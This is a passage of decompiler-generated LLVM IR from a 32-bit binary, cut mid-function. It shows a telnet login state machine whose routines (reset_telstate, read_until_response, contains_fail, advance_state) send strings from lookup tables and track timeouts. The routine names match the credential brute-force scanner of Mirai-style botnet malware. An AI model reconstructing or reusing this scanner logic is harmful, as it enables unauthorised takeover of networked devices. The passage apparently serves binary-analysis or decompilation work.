  store i32 2, i32* %v2_804cf4e, align 4
  %v0_804cf50 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf50 = inttoptr i32 %v0_804cf2f to i32*
  store i32 %v0_804cf50, i32* %v3_804cf50, align 4
  %v0_804cf51 = load i32, i32* %stack_var_-332, align 4
  %v1_804cf51 = load i32, i32* %stack_var_-328, align 4
  %v2_804cf51 = inttoptr i32 %v0_804cf51 to i32*
  %v3_804cf51 = call i32 @advance_state(i32* %v2_804cf51, i32 %v1_804cf51)
  store i32 %v3_804cf51, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cf5e:                             ; preds = %dec_label_pc_804cda8
  %v13_804cf5e = icmp eq i32 %v5_804ce48, -1
  %v1_804cf62 = icmp eq i1 %v13_804cf5e, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804cf62, label %dec_label_pc_804cf8e, label %dec_label_pc_804cf64

dec_label_pc_804cf64:                             ; preds = %dec_label_pc_804cf5e
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v2_804cf80 = add i32 %v0_804ce4d, 16
  %v3_804cf80 = inttoptr i32 %v2_804cf80 to i32*
  store i32 %v2_804c9be, i32* %v3_804cf80, align 4
  %v1_804cf81 = call i32 @reset_telstate(i32 %v5_804ce48)
  store i32 %v1_804cf81, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cf8e:                             ; preds = %dec_label_pc_804cf5e
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804cfa9 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804cfa9, i32* %eax.global-to-local, align 4
  %v1_804cfab = add i32 %v2_804cfa9, 5
  store i32 %v1_804cfab, i32* @ebx, align 4
  %v1_804cfb1 = add i32 %v0_804ce4d, 16
  %v2_804cfb1 = inttoptr i32 %v1_804cfb1 to i32*
  store i32 0, i32* %v2_804cfb1, align 4
  %v1_804cfb3 = inttoptr i32 %v5_804ce48 to i32*
  %v2_804cfb3 = call i32 @__GI_time(i32* %v1_804cfb3)
  store i32 %v2_804cfb3, i32* %eax.global-to-local, align 4
  %v0_804cfbb = load i32, i32* @ebx, align 4
  %v7_804cfbb = icmp ult i32 %v0_804cfbb, %v2_804cfb3
  %v1_804cfbd = icmp eq i1 %v7_804cfbb, false
  br i1 %v1_804cfbd, label %dec_label_pc_804d8eb, label %dec_label_pc_804cfc3

dec_label_pc_804cfc3:                             ; preds = %dec_label_pc_804cf8e
  %v0_804cfb8 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804cfdf = inttoptr i32 %v0_804cfb8 to i32*
  store i32 %v2_804c9be, i32* %v3_804cfdf, align 4
  %v0_804cfe0 = load i32, i32* %stack_var_-332, align 4
  %v1_804cfe0 = call i32 @reset_telstate(i32 %v0_804cfe0)
  store i32 %v1_804cfe0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cfed:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804d005 = add i32 %v2_804c9be, 24
  store i32 %v1_804d005, i32* %eax.global-to-local, align 4
  %v1_804d008 = inttoptr i32 %v1_804d005 to i32*
  %v2_804d008 = load i32, i32* %v1_804d008, align 4
  store i32 %v2_804d008, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d020 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d020 = load i32, i32* %v3_804d020, align 4
  store i32 %v4_804d020, i32* %eax.global-to-local, align 4
  %v0_804d023 = load i32, i32* @esp, align 4
  %v1_804d026 = add i32 %v0_804d023, -16
  %v2_804d026 = inttoptr i32 %v1_804d026 to i32*
  store i32 134590988, i32* %v2_804d026, align 4
  %v1_804d02b = add i32 %v0_804d023, -20
  %v2_804d02b = inttoptr i32 %v1_804d02b to i32*
  store i32 512, i32* %v2_804d02b, align 4
  %v0_804d030 = load i32, i32* @ebx, align 4
  %v2_804d030 = add i32 %v0_804d023, -24
  %v3_804d030 = inttoptr i32 %v2_804d030 to i32*
  store i32 %v0_804d030, i32* %v3_804d030, align 4
  %v5_804d031 = add i32 %v0_804d023, -28
  %v6_804d031 = inttoptr i32 %v5_804d031 to i32*
  store i32 %arg1, i32* %v6_804d031, align 4
  %v0_804d034 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d034 = add i32 %v0_804d023, -32
  %v3_804d034 = inttoptr i32 %v2_804d034 to i32*
  store i32 %v0_804d034, i32* %v3_804d034, align 4
  %v1_804d035 = call i32 @read_until_response(i32 %v6_804ca0d)
  %v0_804d03a = load i32, i32* @esp, align 4
  %v1_804d03d = icmp eq i32 %v1_804d035, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d03d, label %dec_label_pc_804d0ca, label %dec_label_pc_804d045

dec_label_pc_804d045:                             ; preds = %dec_label_pc_804cfed
  store i32 %v1_804d005, i32* %eax.global-to-local, align 4
  %v2_804d060 = load i32, i32* %v1_804d008, align 4
  store i32 %v2_804d060, i32* %eax.global-to-local, align 4
  %v2_804d065 = add i32 %v0_804d03a, 16
  %v3_804d065 = inttoptr i32 %v2_804d065 to i32*
  store i32 %v2_804d060, i32* %v3_804d065, align 4
  %v0_804d066 = load i32, i32* %stack_var_-332, align 4
  %v1_804d066 = call i32 @contains_fail(i32 %v0_804d066)
  %v0_804d06b = load i32, i32* @esp, align 4
  %v1_804d06e = icmp eq i32 %v1_804d066, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d0ba = add i32 %v0_804d06b, 4
  %v2_804d0ba = inttoptr i32 %v1_804d0ba to i32*
  br i1 %v1_804d06e, label %dec_label_pc_804d09e, label %dec_label_pc_804d072

dec_label_pc_804d072:                             ; preds = %dec_label_pc_804d045
  store i32 0, i32* %v2_804d0ba, align 4
  %v0_804d090 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d090 = inttoptr i32 %v0_804d06b to i32*
  store i32 %v0_804d090, i32* %v3_804d090, align 4
  %v0_804d091 = load i32, i32* %stack_var_-332, align 4
  %v1_804d091 = load i32, i32* %stack_var_-328, align 4
  %v2_804d091 = inttoptr i32 %v0_804d091 to i32*
  %v3_804d091 = call i32 @advance_state(i32* %v2_804d091, i32 %v1_804d091)
  store i32 %v3_804d091, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d09e:                             ; preds = %dec_label_pc_804d045
  store i32 3, i32* %v2_804d0ba, align 4
  %v0_804d0bc = load i32, i32* %eax.global-to-local, align 4
  %v3_804d0bc = inttoptr i32 %v0_804d06b to i32*
  store i32 %v0_804d0bc, i32* %v3_804d0bc, align 4
  %v0_804d0bd = load i32, i32* %stack_var_-332, align 4
  %v1_804d0bd = load i32, i32* %stack_var_-328, align 4
  %v2_804d0bd = inttoptr i32 %v0_804d0bd to i32*
  %v3_804d0bd = call i32 @advance_state(i32* %v2_804d0bd, i32 %v1_804d0bd)
  store i32 %v3_804d0bd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d0ca:                             ; preds = %dec_label_pc_804cfed
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d0e5 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d0e5, i32* %eax.global-to-local, align 4
  %v1_804d0e7 = add i32 %v2_804d0e5, 7
  store i32 %v1_804d0e7, i32* @ebx, align 4
  %v1_804d0ed = add i32 %v0_804d03a, 16
  %v2_804d0ed = inttoptr i32 %v1_804d0ed to i32*
  store i32 0, i32* %v2_804d0ed, align 4
  %v0_804d0ef = load i32, i32* %stack_var_-332, align 4
  %v1_804d0ef = inttoptr i32 %v0_804d0ef to i32*
  %v2_804d0ef = call i32 @__GI_time(i32* %v1_804d0ef)
  store i32 %v2_804d0ef, i32* %eax.global-to-local, align 4
  %v0_804d0f7 = load i32, i32* @ebx, align 4
  %v7_804d0f7 = icmp ult i32 %v0_804d0f7, %v2_804d0ef
  %v1_804d0f9 = icmp eq i1 %v7_804d0f7, false
  br i1 %v1_804d0f9, label %dec_label_pc_804d8eb, label %dec_label_pc_804d0ff

dec_label_pc_804d0ff:                             ; preds = %dec_label_pc_804d0ca
  %v0_804d0f4 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d11b = inttoptr i32 %v0_804d0f4 to i32*
  store i32 %v2_804c9be, i32* %v3_804d11b, align 4
  %v0_804d11c = load i32, i32* %stack_var_-332, align 4
  %v1_804d11c = call i32 @reset_telstate(i32 %v0_804d11c)
  store i32 %v1_804d11c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d129:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d13f = add i32 %v2_804cb79, %v2_804c9bc
  %v4_804d13f = inttoptr i32 %v3_804d13f to i8*
  %v5_804d13f = load i8, i8* %v4_804d13f, align 2
  %v6_804d13f = zext i8 %v5_804d13f to i32
  store i32 %v6_804d13f, i32* %eax.global-to-local, align 4
  %v1_804d148 = mul nuw nsw i32 %v6_804d13f, 4
  %v2_804d148 = add nuw nsw i32 %v1_804d148, 134590884
  %v3_804d148 = inttoptr i32 %v2_804d148 to i32*
  %v4_804d148 = load i32, i32* %v3_804d148, align 4
  %v1_804d15a = and i32 %v4_804d148, -256
  store i32 %v1_804d15a, i32* %eax.global-to-local, align 4
  %v4_804d15d = inttoptr i32 %v4_804d148 to i8*
  store i32 %v4_804d148, i32* @edi, align 4
  %v3_804d163 = call i32 @_strlen(i8* %v4_804d15d)
  store i32 %v3_804d163, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v5_804d182 = load i8, i8* %v4_804d13f, align 2
  %v6_804d182 = zext i8 %v5_804d182 to i32
  store i32 %v6_804d182, i32* %eax.global-to-local, align 4
  %v1_804d18b = mul nuw nsw i32 %v6_804d182, 4
  %v2_804d18b = add nuw nsw i32 %v1_804d18b, 134590884
  %v3_804d18b = inttoptr i32 %v2_804d18b to i32*
  %v4_804d18b = load i32, i32* %v3_804d18b, align 4
  store i32 %v4_804d18b, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d1a8 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d1a8 = load i32, i32* %v3_804d1a8, align 4
  store i32 %v4_804d1a8, i32* %eax.global-to-local, align 4
  %v0_804d1ab = load i32, i32* @esp, align 4
  %v1_804d1ab = add i32 %v0_804d1ab, -4
  %v2_804d1ab = inttoptr i32 %v1_804d1ab to i32*
  store i32 16384, i32* %v2_804d1ab, align 4
  %v0_804d1b0 = load i32, i32* @esi, align 4
  %v2_804d1b0 = add i32 %v0_804d1ab, -8
  %v3_804d1b0 = inttoptr i32 %v2_804d1b0 to i32*
  store i32 %v0_804d1b0, i32* %v3_804d1b0, align 4
  %v0_804d1b1 = load i32, i32* @ebx, align 4
  %v2_804d1b1 = add i32 %v0_804d1ab, -12
  %v3_804d1b1 = inttoptr i32 %v2_804d1b1 to i32*
  store i32 %v0_804d1b1, i32* %v3_804d1b1, align 4
  %v0_804d1b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d1b2 = add i32 %v0_804d1ab, -16
  %v3_804d1b2 = inttoptr i32 %v2_804d1b2 to i32*
  store i32 %v0_804d1b2, i32* %v3_804d1b2, align 4
  %v4_804d1b3 = call i32 @__libc_send(i32 %v4_804d148, i32 %v2_804c8c7, i32 %v6_804ca0d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d1b3, i32* %eax.global-to-local, align 4
  %v0_804d1b8 = load i32, i32* @esp, align 4
  %v2_804d1bb = icmp slt i32 %v4_804d1b3, 0
  %v1_804d1bd = icmp eq i1 %v2_804d1bb, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d1bd, label %dec_label_pc_804d1e9, label %dec_label_pc_804d1bf

dec_label_pc_804d1bf:                             ; preds = %dec_label_pc_804d129
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d1db = inttoptr i32 %v0_804d1b8 to i32*
  store i32 %v2_804c9be, i32* %v3_804d1db, align 4
  %v1_804d1dc = call i32 @reset_telstate(i32 %v4_804d148)
  store i32 %v1_804d1dc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d1e9:                             ; preds = %dec_label_pc_804d129
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d1ff = load i32, i32* %v3_804d1a8, align 4
  store i32 %v4_804d1ff, i32* %eax.global-to-local, align 4
  %v1_804d202 = add i32 %v0_804d1b8, 12
  %v2_804d202 = inttoptr i32 %v1_804d202 to i32*
  store i32 16384, i32* %v2_804d202, align 4
  %v1_804d207 = add i32 %v0_804d1b8, 8
  %v2_804d207 = inttoptr i32 %v1_804d207 to i32*
  store i32 2, i32* %v2_804d207, align 4
  %v1_804d209 = add i32 %v0_804d1b8, 4
  %v2_804d209 = inttoptr i32 %v1_804d209 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80584d6.251 to i32), i32* %v2_804d209, align 4
  %v0_804d20e = load i32, i32* %eax.global-to-local, align 4
  %v3_804d20e = inttoptr i32 %v0_804d1b8 to i32*
  store i32 %v0_804d20e, i32* %v3_804d20e, align 4
  %v4_804d20f = call i32 @__libc_send(i32 %v4_804d148, i32 %v2_804c8c7, i32 %v6_804ca0d, i32 ptrtoint (i32* @0 to i32))
  %v0_804d214 = load i32, i32* @esp, align 4
  %v2_804d217 = icmp slt i32 %v4_804d20f, 0
  %v1_804d219 = icmp eq i1 %v2_804d217, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d219, label %dec_label_pc_804d245, label %dec_label_pc_804d21b

dec_label_pc_804d21b:                             ; preds = %dec_label_pc_804d1e9
  %v3_804d237 = inttoptr i32 %v0_804d214 to i32*
  store i32 %v2_804c9be, i32* %v3_804d237, align 4
  %v1_804d238 = call i32 @reset_telstate(i32 %v4_804d148)
  store i32 %v1_804d238, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d245:                             ; preds = %dec_label_pc_804d1e9
  %v1_804d261 = add i32 %v0_804d214, 4
  %v2_804d261 = inttoptr i32 %v1_804d261 to i32*
  store i32 4, i32* %v2_804d261, align 4
  %v0_804d263 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d263 = inttoptr i32 %v0_804d214 to i32*
  store i32 %v0_804d263, i32* %v3_804d263, align 4
  %v2_804d264 = inttoptr i32 %v4_804d148 to i32*
  %v3_804d264 = call i32 @advance_state(i32* %v2_804d264, i32 %v2_804c8c7)
  store i32 %v3_804d264, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d271:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804d289 = add i32 %v2_804c9be, 24
  store i32 %v1_804d289, i32* %eax.global-to-local, align 4
  %v1_804d28c = inttoptr i32 %v1_804d289 to i32*
  %v2_804d28c = load i32, i32* %v1_804d28c, align 4
  store i32 %v2_804d28c, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d2a4 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d2a4 = load i32, i32* %v3_804d2a4, align 4
  store i32 %v4_804d2a4, i32* %eax.global-to-local, align 4
  %v0_804d2a7 = load i32, i32* @esp, align 4
  %v1_804d2aa = add i32 %v0_804d2a7, -16
  %v2_804d2aa = inttoptr i32 %v1_804d2aa to i32*
  store i32 ptrtoint (i32* @global_var_805b20c to i32), i32* %v2_804d2aa, align 4
  %v1_804d2af = add i32 %v0_804d2a7, -20
  %v2_804d2af = inttoptr i32 %v1_804d2af to i32*
  store i32 512, i32* %v2_804d2af, align 4
  %v0_804d2b4 = load i32, i32* @ebx, align 4
  %v2_804d2b4 = add i32 %v0_804d2a7, -24
  %v3_804d2b4 = inttoptr i32 %v2_804d2b4 to i32*
  store i32 %v0_804d2b4, i32* %v3_804d2b4, align 4
  %v5_804d2b5 = add i32 %v0_804d2a7, -28
  %v6_804d2b5 = inttoptr i32 %v5_804d2b5 to i32*
  store i32 %arg1, i32* %v6_804d2b5, align 4
  %v0_804d2b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d2b8 = add i32 %v0_804d2a7, -32
  %v3_804d2b8 = inttoptr i32 %v2_804d2b8 to i32*
  store i32 %v0_804d2b8, i32* %v3_804d2b8, align 4
  %v1_804d2b9 = call i32 @read_until_response(i32 %v6_804ca0d)
  %v0_804d2be = load i32, i32* @esp, align 4
  %v1_804d2c1 = icmp eq i32 %v1_804d2b9, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d2c1, label %dec_label_pc_804d34e, label %dec_label_pc_804d2c9

dec_label_pc_804d2c9:                             ; preds = %dec_label_pc_804d271
  store i32 %v1_804d289, i32* %eax.global-to-local, align 4
  %v2_804d2e4 = load i32, i32* %v1_804d28c, align 4
  store i32 %v2_804d2e4, i32* %eax.global-to-local, align 4
  %v2_804d2e9 = add i32 %v0_804d2be, 16
  %v3_804d2e9 = inttoptr i32 %v2_804d2e9 to i32*
  store i32 %v2_804d2e4, i32* %v3_804d2e9, align 4
  %v1_804d2ea = call i32 @contains_fail(i32 %stack_var_-620.244)
  %v0_804d2ef = load i32, i32* @esp, align 4
  %v1_804d2f2 = icmp eq i32 %v1_804d2ea, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d33e = add i32 %v0_804d2ef, 4
  %v2_804d33e = inttoptr i32 %v1_804d33e to i32*
  br i1 %v1_804d2f2, label %dec_label_pc_804d322, label %dec_label_pc_804d2f6

dec_label_pc_804d2f6:                             ; preds = %dec_label_pc_804d2c9
  store i32 0, i32* %v2_804d33e, align 4
  %v0_804d314 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d314 = inttoptr i32 %v0_804d2ef to i32*
  store i32 %v0_804d314, i32* %v3_804d314, align 4
  %v2_804d315 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804d315 = call i32 @advance_state(i32* %v2_804d315, i32 %v2_804c8c7)
  store i32 %v3_804d315, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d322:                             ; preds = %dec_label_pc_804d2c9
  store i32 5, i32* %v2_804d33e, align 4
  %v0_804d340 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d340 = inttoptr i32 %v0_804d2ef to i32*
  store i32 %v0_804d340, i32* %v3_804d340, align 4
  %v2_804d341 = inttoptr i32 %stack_var_-620.244 to i32*
  %v3_804d341 = call i32 @advance_state(i32* %v2_804d341, i32 %v2_804c8c7)
  store i32 %v3_804d341, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d34e:                             ; preds = %dec_label_pc_804d271
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d369 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d369, i32* %eax.global-to-local, align 4
  %v1_804d36b = add i32 %v2_804d369, 3
  store i32 %v1_804d36b, i32* @ebx, align 4
  %v1_804d371 = add i32 %v0_804d2be, 16
  %v2_804d371 = inttoptr i32 %v1_804d371 to i32*
  store i32 0, i32* %v2_804d371, align 4
  %v1_804d373 = inttoptr i32 %stack_var_-620.244 to i32*
  %v2_804d373 = call i32 @__GI_time(i32* %v1_804d373)
  store i32 %v2_804d373, i32* %eax.global-to-local, align 4
  %v0_804d37b = load i32, i32* @ebx, align 4
  %v7_804d37b = icmp ult i32 %v0_804d37b, %v2_804d373
  %v1_804d37d = icmp eq i1 %v7_804d37b, false
  br i1 %v1_804d37d, label %dec_label_pc_804d8eb, label %dec_label_pc_804d383

dec_label_pc_804d383:                             ; preds = %dec_label_pc_804d34e
  %v0_804d378 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d39f = inttoptr i32 %v0_804d378 to i32*
  store i32 %v2_804c9be, i32* %v3_804d39f, align 4
  %v1_804d3a0 = call i32 @reset_telstate(i32 %stack_var_-620.244)
  store i32 %v1_804d3a0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d3ad:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d3c3 = add i32 %v2_804cb3f, %v2_804c9bc
  %v4_804d3c3 = inttoptr i32 %v3_804d3c3 to i8*
  %v5_804d3c3 = load i8, i8* %v4_804d3c3, align 1
  %v6_804d3c3 = zext i8 %v5_804d3c3 to i32
  store i32 %v6_804d3c3, i32* %eax.global-to-local, align 4
  %v1_804d3cc = mul nuw nsw i32 %v6_804d3c3, 4
  %v2_804d3cc = add nuw nsw i32 %v1_804d3cc, 134590900
  %v3_804d3cc = inttoptr i32 %v2_804d3cc to i32*
  %v4_804d3cc = load i32, i32* %v3_804d3cc, align 4
  %v1_804d3de = and i32 %v4_804d3cc, -256
  store i32 %v1_804d3de, i32* %eax.global-to-local, align 4
  %v4_804d3e1 = inttoptr i32 %v4_804d3cc to i8*
  store i32 %v4_804d3cc, i32* @edi, align 4
  %v3_804d3e7 = call i32 @_strlen(i8* %v4_804d3e1)
  store i32 %v3_804d3e7, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v5_804d406 = load i8, i8* %v4_804d3c3, align 1
  %v6_804d406 = zext i8 %v5_804d406 to i32
  store i32 %v6_804d406, i32* %eax.global-to-local, align 4
  %v1_804d40f = mul nuw nsw i32 %v6_804d406, 4
  %v2_804d40f = add nuw nsw i32 %v1_804d40f, 134590900
  %v3_804d40f = inttoptr i32 %v2_804d40f to i32*
  %v4_804d40f = load i32, i32* %v3_804d40f, align 4
  store i32 %v4_804d40f, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d42c = inttoptr i32 %v2_804c9be to i32*
  %v4_804d42c = load i32, i32* %v3_804d42c, align 4
  store i32 %v4_804d42c, i32* %eax.global-to-local, align 4
  %v0_804d42f = load i32, i32* @esp, align 4
  %v1_804d42f = add i32 %v0_804d42f, -4
  %v2_804d42f = inttoptr i32 %v1_804d42f to i32*
  store i32 16384, i32* %v2_804d42f, align 4
  %v0_804d434 = load i32, i32* @esi, align 4
  %v2_804d434 = add i32 %v0_804d42f, -8
  %v3_804d434 = inttoptr i32 %v2_804d434 to i32*
  store i32 %v0_804d434, i32* %v3_804d434, align 4
  %v0_804d435 = load i32, i32* @ebx, align 4
  %v2_804d435 = add i32 %v0_804d42f, -12
  %v3_804d435 = inttoptr i32 %v2_804d435 to i32*
  store i32 %v0_804d435, i32* %v3_804d435, align 4
  %v0_804d436 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d436 = add i32 %v0_804d42f, -16
  %v3_804d436 = inttoptr i32 %v2_804d436 to i32*
  store i32 %v0_804d436, i32* %v3_804d436, align 4
  %v4_804d437 = call i32 @__libc_send(i32 %v4_804d3cc, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  store i32 %v4_804d437, i32* %eax.global-to-local, align 4
  %v0_804d43c = load i32, i32* @esp, align 4
  %v2_804d43f = icmp slt i32 %v4_804d437, 0
  %v1_804d441 = icmp eq i1 %v2_804d43f, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d441, label %dec_label_pc_804d46d, label %dec_label_pc_804d443

dec_label_pc_804d443:                             ; preds = %dec_label_pc_804d3ad
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d45f = inttoptr i32 %v0_804d43c to i32*
  store i32 %v2_804c9be, i32* %v3_804d45f, align 4
  %v1_804d460 = call i32 @reset_telstate(i32 %v4_804d3cc)
  store i32 %v1_804d460, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d46d:                             ; preds = %dec_label_pc_804d3ad
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d483 = load i32, i32* %v3_804d42c, align 4
  store i32 %v4_804d483, i32* %eax.global-to-local, align 4
  %v1_804d486 = add i32 %v0_804d43c, 12
  %v2_804d486 = inttoptr i32 %v1_804d486 to i32*
  store i32 16384, i32* %v2_804d486, align 4
  %v1_804d48b = add i32 %v0_804d43c, 8
  %v2_804d48b = inttoptr i32 %v1_804d48b to i32*
  store i32 2, i32* %v2_804d48b, align 4
  %v1_804d48d = add i32 %v0_804d43c, 4
  %v2_804d48d = inttoptr i32 %v1_804d48d to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80584d6.251 to i32), i32* %v2_804d48d, align 4
  %v0_804d492 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d492 = inttoptr i32 %v0_804d43c to i32*
  store i32 %v0_804d492, i32* %v3_804d492, align 4
  %v4_804d493 = call i32 @__libc_send(i32 %v4_804d3cc, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  %v0_804d498 = load i32, i32* @esp, align 4
  %v2_804d49b = icmp slt i32 %v4_804d493, 0
  %v1_804d49d = icmp eq i1 %v2_804d49b, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  br i1 %v1_804d49d, label %dec_label_pc_804d4c9, label %dec_label_pc_804d49f

dec_label_pc_804d49f:                             ; preds = %dec_label_pc_804d46d
  %v3_804d4bb = inttoptr i32 %v0_804d498 to i32*
  store i32 %v2_804c9be, i32* %v3_804d4bb, align 4
  %v1_804d4bc = call i32 @reset_telstate(i32 %v4_804d3cc)
  store i32 %v1_804d4bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d4c9:                             ; preds = %dec_label_pc_804d46d
  %v1_804d4e5 = add i32 %v0_804d498, 4
  %v2_804d4e5 = inttoptr i32 %v1_804d4e5 to i32*
  store i32 6, i32* %v2_804d4e5, align 4
  %v0_804d4e7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d4e7 = inttoptr i32 %v0_804d498 to i32*
  store i32 %v0_804d4e7, i32* %v3_804d4e7, align 4
  %v2_804d4e8 = inttoptr i32 %v4_804d3cc to i32*
  %v3_804d4e8 = call i32 @advance_state(i32* %v2_804d4e8, i32 %stack_var_-620.244)
  store i32 %v3_804d4e8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d4f5:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804d50d = add i32 %v2_804c9be, 24
  store i32 %v1_804d50d, i32* %eax.global-to-local, align 4
  %v1_804d510 = inttoptr i32 %v1_804d50d to i32*
  %v2_804d510 = load i32, i32* %v1_804d510, align 4
  store i32 %v2_804d510, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d528 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d528 = load i32, i32* %v3_804d528, align 4
  store i32 %v4_804d528, i32* %eax.global-to-local, align 4
  %v0_804d52b = load i32, i32* @esp, align 4
  %v1_804d52e = add i32 %v0_804d52b, -16
  %v2_804d52e = inttoptr i32 %v1_804d52e to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805b260.252 to i32), i32* %v2_804d52e, align 4
  %v1_804d533 = add i32 %v0_804d52b, -20
  %v2_804d533 = inttoptr i32 %v1_804d533 to i32*
  store i32 512, i32* %v2_804d533, align 4
  %v0_804d538 = load i32, i32* @ebx, align 4
  %v2_804d538 = add i32 %v0_804d52b, -24
  %v3_804d538 = inttoptr i32 %v2_804d538 to i32*
  store i32 %v0_804d538, i32* %v3_804d538, align 4
  %v5_804d539 = add i32 %v0_804d52b, -28
  %v6_804d539 = inttoptr i32 %v5_804d539 to i32*
  store i32 %arg1, i32* %v6_804d539, align 4
  %v0_804d53c = load i32, i32* %eax.global-to-local, align 4
  %v2_804d53c = add i32 %v0_804d52b, -32
  %v3_804d53c = inttoptr i32 %v2_804d53c to i32*
  store i32 %v0_804d53c, i32* %v3_804d53c, align 4
  %v1_804d53d = call i32 @read_until_response(i32 %v6_804ca0d)
  store i32 %v1_804d53d, i32* %eax.global-to-local, align 4
  %v0_804d542 = load i32, i32* @esp, align 4
  %v1_804d545 = icmp eq i32 %v1_804d53d, 0
